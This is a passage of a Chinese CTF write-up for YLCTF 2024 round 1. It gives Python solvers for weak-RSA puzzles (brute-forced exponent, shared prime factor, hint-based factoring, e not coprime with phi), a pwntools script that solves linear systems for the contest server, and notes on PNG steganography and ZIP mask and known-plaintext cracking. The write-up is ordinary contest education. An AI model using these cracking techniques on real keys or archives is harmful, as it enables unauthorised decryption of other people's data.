style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Util.number <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> gmpy2 <span style=color:#f92672>import</span> invert, gcd
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p <span style=color:#f92672>=</span> <span style=color:#ae81ff>112201812592436732390795120344111949417282805598314874949132199714697698933980025001138515893011073823715376332558632580563147885418631793000008453933543935617128269371275964779672888059389120797503550397834151733721290859419396400302434404551112484195071653351729447294368676427327217463094723449293599543541</span>
</span></span><span style=display:flex><span>q <span style=color:#f92672>=</span> <span style=color:#ae81ff>177020901129489152716203177604566447047904210970788458377477238771801463954823395388149502481778049515384638107090852884561335334330598757905074879935774091890632735202395688784335456371467073899458492800214225585277983419966028073512968573622161412555169766112847647015717557828009246475428909355149575012613</span>
</span></span><span style=display:flex><span>c <span style=color:#f92672>=</span> <span style=color:#ae81ff>2924474039245207571198784141495689937992753969132480503242933533024162740004938423057237165017818906240932582715571015311615140080805023083962661783117059081563515779040295926885648843373271315827557447038547354198633841318619550200065416569879422309228789074212184023902170629973366868476512892731022218074481334467704848598178703915477912059538625730030159772883926139645914921352787315268142917830673283253131667111029720811149494108036204927030497411599878456477044315081343437693246136153310194047948564341148092314660072088671342677689405603317615027453036593857501070187347664725660962477605859064071664385456</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>n <span style=color:#f92672>=</span> p <span style=color:#f92672>*</span> q
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>phi <span style=color:#f92672>=</span> (p <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>) <span style=color:#f92672>*</span> (q <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>generate_primes</span>(start, end):
</span></span><span style=display:flex><span>    primes <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> num <span style=color:#f92672>in</span> range(start, end <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> isPrime(num):
</span></span><span style=display:flex><span>            primes<span style=color:#f92672>.</span>append(num)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> primes
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> e <span style=color:#f92672>in</span> generate_primes(<span style=color:#ae81ff>55555</span>, <span style=color:#ae81ff>66666</span>):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> gcd(e, phi) <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>            d <span style=color:#f92672>=</span> invert(e, phi)
</span></span><span style=display:flex><span>            m <span style=color:#f92672>=</span> pow(c, d, n)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>           
</span></span><span style=display:flex><span>            flag <span style=color:#f92672>=</span> long_to_bytes(m)<span style=color:#f92672>.</span>decode(<span style=color:#e6db74>&#39;utf-8&#39;</span>)
</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;找到 e = </span><span style=color:#e6db74>{</span>e<span style=color:#e6db74>}</span><span style=color:#e6db74>, 解密后的 flag: </span><span style=color:#e6db74>{</span>flag<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>break</span>  
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>ZeroDivisionError</span>:
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>continue</span>  <span style=color:#75715e># 如果 invert 失败，则继续尝试下一个 e</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>UnicodeDecodeError</span>:
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>continue</span>  <span style=color:#75715e># 如果解码失败，则继续尝试下一个 e</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># YLCTF{fbb6186c-6603-11ef-ba80-deb857dc15be}</span>
</span></span></code></pre></div><h5 id=round1signrsa>[round1]signrsa</h5><p>RSA 模数 n1 和 n2 之间有公因子 q，从而使得可以分别对这两个模数进行分解，然后使用对应的私钥对密文进行解密，通过共模攻击解密</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> gmpy2
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Util.number <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>n1 <span style=color:#f92672>=</span> <span style=color:#ae81ff>18674375108313094928585156581138941368570022222190945461284402673204018075354069827186085851309806592398721628845336840532779579197302984987661547245423180760958022898546496524249201679543421158842103496452861932183144343315925106154322066796612415616342291023962127055311307613898583850177922930685155351380500587263611591893137588708003711296496548004793832636078992866149115453883484010146248683416979269684197112659302912316105354447631916609587360103908746719586185593386794532066034112164661723748874045470225129298518385683561122623859924435600673501186244422907402943929464694448652074412105888867178867357727</span>
</span></span><span style=display:flex><span>n2 <span style=color:#f92672>=</span> <span style=color:#ae81ff>20071978783607427283823783012022286910630968751671103864055982304683197064862908267206049336732205051588820325894943126769930029619538705149178241710069113634567118672515743206769333625177879492557703359178528342489585156713623530654319500738508146831223487732824835005697932704427046675392714922683584376449203594641540794557871881581407228096642417744611261557101573050163285919971711214856243031354845945564837109657494523902296444463748723639109612438012590084771865377795409000586992732971594598355272609789079147061852664472115395344504822644651957496307894998467309347038349470471900776050769578152203349128951</span>
</span></span><span style=display:flex><span>e <span style=color:#f92672>=</span> <span style=color:#ae81ff>65537</span>
</span></span><span style=display:flex><span>q <span style=color:#f92672>=</span> gmpy2<span style=color:#f92672>.</span>gcd(n1,n2)
</span></span><span style=display:flex><span>print(q)
</span></span><span style=display:flex><span><span style=color:#75715e># 10210039189276167395636779557271057346691950991057423589319031237857569595284598319093522326723650646963251941930167018746859556383067696079622198265424441</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p1 <span style=color:#f92672>=</span> n1 <span style=color:#f92672>//</span> q
</span></span><span style=display:flex><span>p2 <span style=color:#f92672>=</span> n2 <span style=color:#f92672>//</span> q
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>d1 <span style=color:#f92672>=</span> gmpy2<span style=color:#f92672>.</span>invert(e,(q<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>)<span style=color:#f92672>*</span>(p1<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>))
</span></span><span style=display:flex><span>d2 <span style=color:#f92672>=</span> gmpy2<span style=color:#f92672>.</span>invert(e,(q<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>)<span style=color:#f92672>*</span>(p2<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>c <span style=color:#f92672>=</span> <span style=color:#ae81ff>17087345023822081623891751423634072935359933429883025338799316908134539732911987403379813791051721409025872046014445468757120127961953783792146805906255385927316168869306218712056692227481252348951991457948040258007096536015704568840248330993815252823424627958278346871867901249369170134106070695916355118499922945313335801615652226556995849239616859826762866841805915253356402366997693599487016453619500217382302173033771577307792501865322742699412806457301297719922487797626724702793650939979227432331932830374740050145956182452965260035182810782721888226896944881610943610565496963461471122317296063535420461202109</span>
</span></span><span style=display:flex><span>m <span style=color:#f92672>=</span> pow(c,d2,n2)
</span></span><span style=display:flex><span>m <span style=color:#f92672>=</span> pow(m,d1,n1)
</span></span><span style=display:flex><span>print(long_to_bytes(m))
</span></span><span style=display:flex><span><span style=color:#75715e># b&#39;YLCTF{6567543c-e55b-4563-96ea-e7412e6834c2}\n&#39;</span>
</span></span></code></pre></div><h5 id=round1ezrsa>[round1]ezrsa</h5><p>也是类共模攻击</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Util.number <span style=color:#f92672>import</span> long_to_bytes, inverse
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> math <span style=color:#f92672>import</span> gcd
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>hint <span style=color:#f92672>=</span> <span style=color:#ae81ff>74749248594786596691182255254760227675255640419811402596325257219264047909491854266322448991637721043565574231631858096560042784343181104155107927958136483921037567399591407065870395299938514992590953052021824859260647798407649617552126176876304021384535351268838294566489926141346712140945311688664783400430</span>
</span></span><span style=display:flex><span>n <span style=color:#f92672>=</span> <span style=color:#ae81ff>146150746308368977558105420785404636106107297097656606561134260305844960246816673265377081884447744494438593580830134146856713782255534506122943914554490808124199966427121519694676728571857729213721192818898378912680306144869946238782714021401494162427357692727211780506245166118326256365562777182481342235649</span>
</span></span><span style=display:flex><span>c <span style=color:#f92672>=</span> <span style=color:#ae81ff>12817272835509631426126672293486991243028800172545793296231214648592002361121076145968763436527652893903622692932403498323802323146995559960945697843044017192966527560462131618029760025950956635249851792561073659666145624864040328809279977987225518572316396679320621448299428750551755789817002220213790188515</span>
</span></span><span style=display:flex><span>e <span style=color:#f92672>=</span> <span style=color:#ae81ff>65537</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p <span style=color:#f92672>=</span> gcd(pow(<span style=color:#ae81ff>20240918</span>, e, n) <span style=color:#f92672>-</span> hint, n)
</span></span><span style=display:flex><span>q <span style=color:#f92672>=</span> n <span style=color:#f92672>//</span> p
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>d <span style=color:#f92672>=</span> inverse(e, (p <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>) <span style=color:#f92672>*</span> (q <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>))
</span></span><span style=display:flex><span>flag <span style=color:#f92672>=</span> long_to_bytes(pow(c, d, n))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(flag)
</span></span><span style=display:flex><span><span style=color:#75715e># b&#39;YLCTF{12f142fc-351d-486f-aaa6-b64ebf3e7bdf}\n&#39;</span>
</span></span></code></pre></div><h5 id=round1ra3>[round1]r(A)=3</h5><p>典型的矩阵问题，进行交互循环300次得到flag</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> numpy <span style=color:#66d9ef>as</span> np
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#39;challenge.yuanloo.com&#39;</span>, <span style=color:#ae81ff>23115</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> attempt <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>300</span>):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Attempt </span><span style=color:#e6db74>{</span>attempt <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span><span style=color:#e6db74>}</span><span style=color:#e6db74>...&#34;</span>)  
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        line <span style=color:#f92672>=</span> p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#34;:&#34;</span><span style=color:#f92672>.</span>encode())
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Received: </span><span style=color:#e6db74>{</span>line<span style=color:#f92672>.</span>decode()<span style=color:#f92672>.</span>strip()<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        line <span style=color:#f92672>=</span> p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#34;x=&#34;</span><span style=color:#f92672>.</span>encode())
</span></span><span style=display:flex><span>        equation_str <span style=color:#f92672>=</span> line<span style=color:#f92672>.</span>decode()<span style=color:#f92672>.</span>strip()
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Received: </span><span style=color:#e6db74>{</span>equation_str<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        equations <span style=color:#f92672>=</span> equation_str<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>        A <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span>        B <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> i, eq <span style=color:#f92672>in</span> enumerate(equations):
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> i <span style=color:#f92672>==</span> len(equations) <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>:  <span style=color:#75715e># 忽略最后一行</span>
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>continue</span>
</span></span><span style=display:flex><span>            left, right <span style=color:#f92672>=</span> eq<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#34;=&#34;</span>)
</span></span><span style=display:flex><span>            B<span style=color:#f92672>.</span>append(float(right<span style=color:#f92672>.</span>strip()))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#75715e># 提取系数</span>
</span></span><span style=display:flex><span>            coefficients <span style=color:#f92672>=</span> [<span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>]  <span style=color:#75715e># 对应 x, y, z 的系数</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>for</span> term <span style=color:#f92672>in</span> left<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#34;+&#34;</span>):
</span></span><span style=display:flex><span>                term <span style=color:#f92672>=</span> term<span style=color:#f92672>.</span>strip()
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#34;x&#34;</span> <span style=color:#f92672>in</span> term:
</span></span><span style=display:flex><span>                    coefficients[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> float(term<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#34;*&#34;</span>)[<span style=color:#ae81ff>0</span>]) <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#34;*&#34;</span> <span style=color:#f92672>in</span> term <span style=color:#66d9ef>else</span> <span style=color:#ae81ff>1.0</span>
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>elif</span> <span style=color:#e6db74>&#34;y&#34;</span> <span style=color:#f92672>in</span> term:
</span></span><span style=display:flex><span>                    coefficients[<span style=color:#ae81ff>1</span>] <span style=color:#f92672>=</span> float(term<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#34;*&#34;</span>)[<span style=color:#ae81ff>0</span>]) <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#34;*&#34;</span> <span style=color:#f92672>in</span> term <span style=color:#66d9ef>else</span> <span style=color:#ae81ff>1.0</span>
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>elif</span> <span style=color:#e6db74>&#34;z&#34;</span> <span style=color:#f92672>in</span> term:
</span></span><span style=display:flex><span>                    coefficients[<span style=color:#ae81ff>2</span>] <span style=color:#f92672>=</span> float(term<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#34;*&#34;</span>)[<span style=color:#ae81ff>0</span>]) <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#34;*&#34;</span> <span style=color:#f92672>in</span> term <span style=color:#66d9ef>else</span> <span style=color:#ae81ff>1.0</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            A<span style=color:#f92672>.</span>append(coefficients)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        A <span style=color:#f92672>=</span> np<span style=color:#f92672>.</span>array(A)
</span></span><span style=display:flex><span>        B <span style=color:#f92672>=</span> np<span style=color:#f92672>.</span>array(B)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        solution <span style=color:#f92672>=</span> np<span style=color:#f92672>.</span>linalg<span style=color:#f92672>.</span>solve(A, B)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span>        p<span style=color:#f92672>.</span>sendline(str(int(solution[<span style=color:#ae81ff>0</span>])))  
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>solution[<span style=color:#ae81ff>0</span>]<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>        line <span style=color:#f92672>=</span> p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#34;y=&#34;</span><span style=color:#f92672>.</span>encode())
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Received: </span><span style=color:#e6db74>{</span>line<span style=color:#f92672>.</span>decode()<span style=color:#f92672>.</span>strip()<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>        p<span style=color:#f92672>.</span>sendline(str(int(solution[<span style=color:#ae81ff>1</span>])))  
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>solution[<span style=color:#ae81ff>1</span>]<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>        line <span style=color:#f92672>=</span> p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#34;z=&#34;</span><span style=color:#f92672>.</span>encode())
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Received: </span><span style=color:#e6db74>{</span>line<span style=color:#f92672>.</span>decode()<span style=color:#f92672>.</span>strip()<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>        p<span style=color:#f92672>.</span>sendline(str(int(solution[<span style=color:#ae81ff>2</span>])))
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>solution[<span style=color:#ae81ff>2</span>]<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>Exception</span> <span style=color:#66d9ef>as</span> e:
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Attempt </span><span style=color:#e6db74>{</span>attempt <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span><span style=color:#e6db74>}</span><span style=color:#e6db74> failed: </span><span style=color:#e6db74>{</span>e<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>interactive()
</span></span></code></pre></div><h5 id=round1threecry>[round1]threecry</h5><p>参考文章https://blog.csdn.net/luochen2436/article/details/131948093</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> gmpy2
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Util.number <span style=color:#f92672>import</span> long_to_bytes
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>e <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xe18e</span>
</span></span><span style=display:flex><span>crypto05<span style=color:#f92672>=</span> <span style=color:#ae81ff>16623038441079077059861502314553840945014390827451667324209537222817794990697456726185616589892380248771957751215156366431853682717356212256182541599038824352426429058283605462766315213017886613935143369630579915129950428539117781616821575904280675596170305716041161748779293269633614559889401304768245038227061</span>
</span></span><span style=display:flex><span>crypto03<span style=color:#f92672>=</span> <span style=color:#ae81ff>7370478569029817135349016311298954172270465460003018672225010525611372855698643108316167758095660953716705265165460646442696451806405620591202977137450538604803993325516057226246866037605963589652887018894515430484657967483718879717967258257252134148706147029651520914313120373591263784166639605955378617102045</span>
</span></span><span style=display:flex><span>number1 <span style=color:#f92672>=</span> <span style=color:#ae81ff>6035830951309638186877554194461701691293718312181839424149825035972373443231514869488117139554688905904333169357086297500189578624512573983935412622898726797379658795547168254487169419193859102095920229216279737921183786260128443133977458414094572688077140538467216150378641116223616640713960883880973572260683</span>
</span></span><span style=display:flex><span>number2 <span style=color:#f92672>=</span> <span style=color:#ae81ff>20163906788220322201451577848491140709934459544530540491496316478863216041602438391240885798072944983762763612154204258364582429930908603435291338810293235475910630277814171079127000082991765275778402968190793371421104016122994314171387648385459262396767639666659583363742368765758097301899441819527512879933947</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>a_near <span style=color:#f92672>=</span> gmpy2<span style=color:#f92672>.</span>iroot(number2<span style=color:#f92672>//</span><span style=color:#ae81ff>325</span>,<span style=color:#ae81ff>2</span>)[<span style=color:#ae81ff>0</span>]
</span></span><span style=display:flex><span><span style=color:#66d9ef>while</span> number2 <span style=color:#f92672>%</span> gmpy2<span style=color:#f92672>.</span>next_prime(<span style=color:#ae81ff>13</span><span style=color:#f92672>*</span>a_near)<span style=color:#f92672>!=</span><span style=color:#ae81ff>0</span>:
</span></span><span style=display:flex><span>    a_near <span style=color:#f92672>=</span> gmpy2<span style=color:#f92672>.</span>next_prime(a_near)
</span></span><span style=display:flex><span>p <span style=color:#f92672>=</span> gmpy2<span style=color:#f92672>.</span>next_prime(<span style=color:#ae81ff>13</span><span style=color:#f92672>*</span>a_near)
</span></span><span style=display:flex><span>q <span style=color:#f92672>=</span> number2<span style=color:#f92672>//</span>p
</span></span><span style=display:flex><span>phi <span style=color:#f92672>=</span> (p<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>)<span style=color:#f92672>*</span>(q<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>t <span style=color:#f92672>=</span> gmpy2<span style=color:#f92672>.</span>gcd(e, phi)
</span></span><span style=display:flex><span>d <span style=color:#f92672>=</span> gmpy2<span style=color:#f92672>.</span>invert(e <span style=color:#f92672>//</span> t, phi)
</span></span><span style=display:flex><span>m2 <span style=color:#f92672>=</span> gmpy2<span style=color:#f92672>.</span>iroot(pow(crypto05, d, number2), t)[<span style=color:#ae81ff>0</span>]
</span></span><span style=display:flex><span>flag2 <span style=color:#f92672>=</span> long_to_bytes(m2)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>d1 <span style=color:#f92672>=</span> gmpy2<span style=color:#f92672>.</span>invert(number1, phi)
</span></span><span style=display:flex><span>m1 <span style=color:#f92672>=</span> pow(crypto03, d1, number2)
</span></span><span style=display:flex><span>flag1 <span style=color:#f92672>=</span> long_to_bytes(m1)
</span></span><span style=display:flex><span>print(flag1 <span style=color:#f92672>+</span> flag2)
</span></span><span style=display:flex><span><span style=color:#75715e># b&#39;YLCTF{8d547f68-f394-4254-9ada-2dc306862b66}\n&#39;</span>
</span></span></code></pre></div><h4 id=misc>Misc</h4><h5 id=签到-打卡小能手>[签到] 打卡小能手</h5><p><img alt=打卡小助手 loading=lazy src=/posts/ctf/ylctf2024/%E6%89%93%E5%8D%A1%E5%B0%8F%E5%8A%A9%E6%89%8B.png></p><h5 id=round-1-hide_png>[Round 1] hide_png</h5><p>给的图片用stegsolve来看，有点模糊但是可以看看</p><p><img alt=hide_png loading=lazy src=/posts/ctf/ylctf2024/hide_png.png></p><p>flag没存忘了</p><h5 id=round-1-pngorzip>[Round 1] pngorzip</h5><p><img alt=pngorzip loading=lazy src=/posts/ctf/ylctf2024/pngorzip.png></p><p>save bin形式得到zip，010去掉114514????后面的冗杂内容进行掩码攻击得到giao，解压得到flag</p><p>YLCTF{d359d6e4-740a-49cf-83eb-5b0308f09c8c}</p><h5 id=round-1-plain_crack>[Round 1] plain_crack</h5><p>尝试再写个压缩包进行明文攻击</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> zipfile
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> os
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>create</span>(files, zfile):
</span></span><span style=display:flex><span>    <span style=color:#75715e># 创建一个新的 ZIP 文件</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>with</span> zipfile<span style=color:#f92672>.</span>ZipFile(zfile, <span style=color:#e6db74>&#39;w&#39;</span>) <span style=color:#66d9ef>as</span> zipf:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> file <span style=color:#f92672>in</span> files:
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span>            zipf<span style=color:#f92672>.</span>write(file, os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>basename(file), compress_type<span style=color:#f92672>=</span>zipfile<span style=color:#f92672>.</span>ZIP_DEFLATED)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;__main__&#39;</span>:
</span></span><span style=display:flex><span>    files <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#39;build.py&#39;</span>]  
</span></span><span style=display:flex><span>    zfile <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;crack2.zip&#39;</span>
</span></span><span style=display:flex><span>    create(files, zfile)
</span></span></code></pre></div><p>pyadminzip我本地的轮子有问题就用了zipfile需要测试几次才可以进行明文攻击，等待几分钟直接解压里面有flag.docx，docx也是一种zip文件形式，改成zip里面有个图片得到flag</p><p><img alt=crack loading=lazy src=/posts/ctf/ylctf2024/crack.png></p><h5 id=round-1-trafficdet>[Round 1] trafficdet</h5><p>是个ai模型分析，把要求告诉chatgpt上传对应的文件然后叫他按形式写出解密脚本就可以了</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> pandas <span style=color:#66d9ef>as</span> pd
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> sklearn.model_selection <span style=color:#f92672>import</span> train_test_split
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> sklearn.ensemble <span style=color:#f92672>import</span> RandomForestClassifier
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> sklearn.metrics <span style=color:#f92672>import</span> accuracy_score
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>load_and_preprocess_data</span>(train_file, test_file):
</span></span><span style=display:flex><span>    <span style=color:#75715e># Load training data</span>
</span></span><span style=display:flex><span>    train_data <span style=color:#f92672>=</span> pd<span style=color:#f92672>.</span>read_csv(train_file)
</span></span><span style=display:flex><span>    train_data <span style=color:#f92672>=</span> train_data<span style=color:#f92672>.</span>dropna()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># Separate features and labels</span>
</span></span><span style=display:flex><span>    X <span style=color:#f92672>=</span> train_data<span style=color:#f92672>.</span>drop(columns<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;Label&#39;</span>])
</span></span><span style=display:flex><span>    y <span style=color:#f92672>=</span> train_data[<span style=color:#e6db74>&#39;Label&#39;</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># Load test data</span>
</span></span><span style=display:flex><span>    test_data <span style=color:#f92672>=</span> pd<span style=color:#f92672>.</span>read_csv(test_file)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> X, y, test_data
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>train_model</span>(X_train, y_train, n_estimators<span style=color:#f92672>=</span><span style=color:#ae81ff>100</span>, random_state<span style=color:#f92672>=</span><span style=color:#ae81ff>42</span>):
</span></span><span style=display:flex><span>    model <span style=color:#f92672>=</span> RandomForestClassifier(n_estimators<span style=color:#f92672>=</span>n_estimators, random_state<span style=color:#f92672>=</span>random_state)
</span></span><span style=display:flex><span>    model<span style=color:#f92672>.</span>fit(X_train, y_train)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> model
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>evaluate_model</span>(model, X_val, y_val):
</span></span><span style=display:flex><span>    y_pred <span style=color:#f92672>=</span> model<span style=color:#f92672>.</span>predict(X_val)
</span></span><span style=display:flex><span>    accuracy <span style=color:#f92672>=</span> accuracy_score(y_val, y_pred)
